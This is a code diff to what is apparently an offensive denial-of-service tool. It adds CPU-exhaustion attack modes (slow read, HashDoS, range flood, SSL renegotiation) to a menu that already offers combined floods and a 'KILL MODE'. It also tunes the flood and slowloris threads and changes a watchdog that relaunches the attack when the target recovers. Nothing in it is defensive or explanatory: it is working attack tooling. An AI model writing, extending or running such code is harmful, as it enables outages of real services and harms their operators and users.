@@ -117,6 +117,12 @@ HELP_TEXT = _make_box(
         f"    {GREEN}mode slowloris{DIM}        Slowloris  {DIM}(hold connections open){DIM}",
         f"    {GREEN}mode bypass{DIM}           Stateful bypass  {DIM}(TCP handshake flood){DIM}",
         "",
+        f"  {B_RED}ATTACK MODES — CPU EXHAUSTION{DIM}",
+        f"    {GREEN}mode slowread{DIM}          Slow Read  {DIM}(exhaust connection pool){DIM}",
+        f"    {GREEN}mode hashcollision{DIM}     HashDoS  {DIM}(PHP/Node hash O(n²)){DIM}",
+        f"    {GREEN}mode rangeflood{DIM}        Range Flood  {DIM}(Apache CPU+mem){DIM}",
+        f"    {GREEN}mode sslreneg{DIM}          SSL Reneg  {DIM}(asymmetric crypto spam){DIM}",
+        "",
         f"  {B_RED}ATTACK MODES — MASSIVE{DIM}",
         f"    {GREEN}mode all{DIM}              ALL L3+L4+L7  {DIM}(14 vectors simultaneous){DIM}",
         f"    {GREEN}mode kill{DIM}             KILL MODE  {DIM}(max destruction + pattern){DIM}",
@@ -688,6 +694,8 @@ def execute_attack(cfg: DDoSConfig):
                         py_total += 1
                     except Exception:
                         py_total += 1
+                    finally:
+                        time.sleep(0.001)
                 py_active = 0
             t = Thread(target=py_flood, daemon=True)
             t.start()
@@ -732,6 +740,7 @@ def execute_attack(cfg: DDoSConfig):
                                     py_total += 1
                                 except:
                                     py_total += 1
+                            await asyncio.sleep(0.001)
                     sem = asyncio.Semaphore(2000)
                     asyncio.run(mass_connect(sem, cfg.target, cfg.port, cfg.time))
                 except ImportError:
@@ -759,7 +768,7 @@ def execute_attack(cfg: DDoSConfig):
                             time.sleep(0.01)
                         s.close()
                     except:
-                        pass
+                        time.sleep(0.05)
                 py_active -= 1
             t3 = Thread(target=slow_loris_py, daemon=True)
             t3.start()
@@ -799,7 +808,7 @@ def execute_attack(cfg: DDoSConfig):
                         elif lat < rtt_baseline * 1.2 and rtt_escalated:
                             print(f"\n  {YELLOW}[RTT] Server stabilizing ({lat:.0f}ms) — maintaining pressure{DIM}")
                     except Exception:
-                        print(f"\n  {YELLOW}[!] Target unreachable — connection refused/timeout{DIM}")
+                        print(f"\n  {GREEN}[TARGET DOWN] Connection refused/timeout — attack working{DIM}")
                     time.sleep(1)
             t_rtt = Thread(target=rtt_monitor, daemon=True)
             t_rtt.start()
@@ -950,6 +959,8 @@ def execute_attack(cfg: DDoSConfig):
                     probe.read()
                     probe.close()
                     lat = (time.time() - t0) * 1000
+                    if 'proc2' in dir() and proc2 and proc2.poll() is None:
+                        continue
                     print(f"\n  {B_RED}[WATCHDOG] TARGET RECOVERED! (RTT: {lat:.0f}ms){DIM}")
                     print(f"  {B_RED}[WATCHDOG] Re-launching attack...{DIM}")
                     proc2 = subprocess.Popen(
